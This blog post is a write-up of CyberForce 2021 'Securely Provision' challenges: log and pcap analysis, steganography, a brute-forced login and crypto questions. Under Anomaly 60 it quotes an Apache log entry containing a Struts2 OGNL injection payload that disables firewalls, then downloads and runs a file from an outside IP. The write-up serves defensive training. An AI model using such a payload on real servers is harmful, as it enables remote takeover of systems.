---
title: "CyberForce 2021 - Securely Provision"
categories:
  - CyberForce
tags:
  - CyberForce
  - CyberForce-2021
  - CyberForce Adventurer
---

# Securely Provision
One of the categories in the Department of Energy's CyberForce Program - Conquer the Hill: Adventurer Edition 2021

[CyberForce 2021 Writeup](/ctf/cyberforce/cyberforce-2021-adventurer-writeup/)

{% include toc %}

## Securely Provision: Anomaly 20 (20pts)
Your organization suspects it was recently the victim of a SQL injection attack and has provided you with a set of HTTP server access logs to determine if this is the case. Analyze the log and provide your supervisor with the name of the internal SQL command that was run on the system running the SQL server during the attack.

syntax hint: Please include parenthesis in your answer. e.g., bananas_oranges_apple()

## Securely Provision: Anomaly 61 (20pts)
You’ve found that a machine on your network has been posting a number of pictures to image boards around the internet, even while the employee who uses it is out of the office. Could this be a data exfiltration scheme, or just a glitchy piece of software? See if you can find anything out of place in this file. 

syntax hint: please only submit the word/string found within the curly braces

### Solution

Used: https://incoherency.co.uk/image-steganography/#unhide

![no-alignment]({{ '/CyberForce-2021/Anom-61.png' | absolute_url }})

Ans: `1k-w0rdz`

## Securely Provision: Anomaly 62 (20pts)
Given the PCAP file, What protocols are utilized by the GE nodes?

Format in alphabetical order with comma between entries e.g. ABCD, EFGH

## Securely Provision: Anomaly 90 (30pts)
What is the name for a function that can be computed easily in one direction, but the inverse is much more difficult?

Syntax Hint: do not include the word 'function' in your answer, and include a hyphen

### Solution

Ans: `one-way`

## Securely Provision: Anomaly 14 (50pts)
Your company outsourced development of a secure message processing server and you have been tasked with helping write a client application to interact with the server.  Another developer has written some skeleton code for the client but is unsure how to implement the encode_message method.  Unfortunately, very little documentation was provided.  Can you help write the code to uncover the flag?  

syntax hint: not case sensitive, no spaces, do not include the {} in your answer

## Securely Provision: Anomaly 27 (50pts)
You work on the security team at Feel Good Inc. This morning a number of your companies websites were inaccessible from inside your companies network. It turns out someone accidently implemented a block in the firewall against a number of Cloudflare address space, which your company uses as a CDN. 

Your task is to write a Python script that uses Cloudflare’s API to pull a list of their public IP addresses so that you can keep them in an allow list to prevent further blocks.

For this anomaly you have been given a shell of a script. It has been documented to indicate where you need to add code. Once you believe you have updated it with the correct code, you can run it and get an output that will include a list of the public IPs and an answer. If it doesn’t output IPs, you did something incorrectly and the answer provided will also be incorrect. 

For this exercise you will be using the CloudFlare python library. Documentation for this library can be found here: https://github.com/cloudflare/python-cloudflare. 

syntax hint: answer is not case sensitive, no spaces

## Securely Provision: Anomaly 59 (50pts)
Johnny Peacap discovered that “Nice Guy” Brutus attacked his ICS control management site via brute force tactics. Luckily, he was able to download a packet capture of the attack traffic for analysis. He needs help finding proof that his site was accessed.Can you find the login password used to gain entry?

syntax hint: answer is not case sensitive, no spaces, include special characters

### Solution

For most of the competition this was marked wrong, until they later corrected it. 

Filtering the pcap file using `http` I saw a lot of POST requests as they attempted to brute force the password. 

I noticed that one of the responses was not a 200 but a 303 See Other which seems like they got the correct password. I looked at the previous POST request.

```
Frame 837: 632 bytes on wire (5056 bits), 632 bytes captured (5056 bits) on interface ens33, id 0
Ethernet II, Src: PcsCompu_c5:0d:1c (08:00:27:c5:0d:1c), Dst: VMware_78:8b:52 (00:0c:29:78:8b:52)
Internet Protocol Version 4, Src: 10.179.72.4, Dst: 10.179.72.7
Transmission Control Protocol, Src Port: 34832, Dst Port: 80, Seq: 1, Ack: 1, Len: 565
Hypertext Transfer Protocol
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "name" = "admin"
    Form item: "pass" = "flag{icscontrol2018!}"
    Form item: "form_build_id" = "form-Zcebb-qiVkJKc0_xgiKkCsNLF8cAYYoHz1yp9vHAuJ8"
    Form item: "form_id" = "user_login_form"
    Form item: "op" = "Log in"
VSS Monitoring Ethernet trailer, Source Port: 0
```

![no-alignment]({{ '/CyberForce-2021/Anom-59.png' | absolute_url }})

Ans: `flag{icscontrol2018!}`

## Securely Provision: Anomaly 60 (50pts)
An EFFBI web administrator has reported that a primary web application is intermittently crashing and suspects malicious activity. Their concern is that the server may have been compromised. The site contains a web form used to report suspected criminal activity to the organization. Examine the provided apache access log file for indicators of compromise and identify the successful attack method to find the flag. 

Syntax hint: just submit the word found inside the curly braces

### Solution
Entry 12293

```
10.11.12.14 - - [01/Jul/2018:13:36:22 -0700] "GET //EFFBI/facilityEFFBI.FacRptInputFieldOffice.executeLoad.action.(#context.setMemberAccess(#dm)))).(#cmd='/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c 169.254.77.252/{flag:PAYLOAD}; chmod 777 2020;./2020;').#cmds=(#iswin?{'cmd.exe'.'/c',#cmd}:{'/bin/bash','-c',#cmd})).(#process=#p.start()).(#p=new java.lang.ProcessBuilder(#cmds)).#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}Accept-Language: zh-CN  HTTP/1.1" 200 23002
```

Ans: `PAYLOAD`

## Securely Provision: Anomaly 67 (50pts)
Our wily hacker does want the snooping admins to see the data content that is being stolen and has used a few tricks to mix things up. From the pcap file, find the original data content that the hacker exfiltrated. Flag is the original data

Syntax hint: answer is not case sensitive, no spaces

### Solution

Using wireshark you can see the code that was executed. 

Modified the code from wireshark a bit to run with python3 and undid the original subtraction by changing the operation to addition.

test.py
```python
#!/usr/bin/python

import sys

ofilename = "hidden_loot.txt"

if len(sys.argv) < 2: 
        print ("not enough args")
        exit()

ih = open(sys.argv[1], "r")
oh = open(ofilename, "w")

print ("s: ", sys.argv[1])

with open(sys.argv[1]) as ih:
        for line in ih:
                for ch in line:
                        oh.write(chr(ord(ch)+0xa))
```

Created a file `important.txt`:

```
Y\Yqm_h;i^WHaIjWhs.
```


Ran the code `python3 test.py important.txt`

Output file `hidden_loot.txt`:

`cfc{wirEshaRkStar}8`

Known that:
```
Our wily hacker does want the snooping admins to see the data content that is being stolen and has used a few tricks to mix things up.

From the pcap file, find the original data content that the hacker exfiltrated. 

Flag is in the "cfc{}" format. 
```

Ans: `wirEshaRkStar`

## Securely Provision: Anomaly 80 (50pts)
In the DES given, what would be the result of the initial permutation if the input were 74A12CD5 643A180B

Syntax hint, include a space between the two strings:  e.g. 122k283 293494 

## Securely Provision: Anomaly 8 (100pts)
Your boss has a coded message that has been lost, and the only way to get to it is through a website that no one at your company has credentials for. You see that this site seems pretty poorly protected, and task yourself with getting the secrete message back. Note: to encourage using login bypass techniques to get to the answer, the php file is password protected. A login environment has been emulated in a c++ out file, where a proper login string will lead to further directions. Once you have access to the php file, you can either look at the source code or load it with localhost and use the technique used on the c++ program again on the more official php login environment.

Syntax hint: answer is not case sensitive, include underscores. e.g., apples_bananas_apples_oranges

## Securely Provision: Anomaly 63 (100pts)
This is a simple “login” program for the Nuclear Power Plant. This program was created with no intention of security, so it was designed to have a single user and a single password. What is the flag?

syntax hint: answer is not case sensitive, no spaces

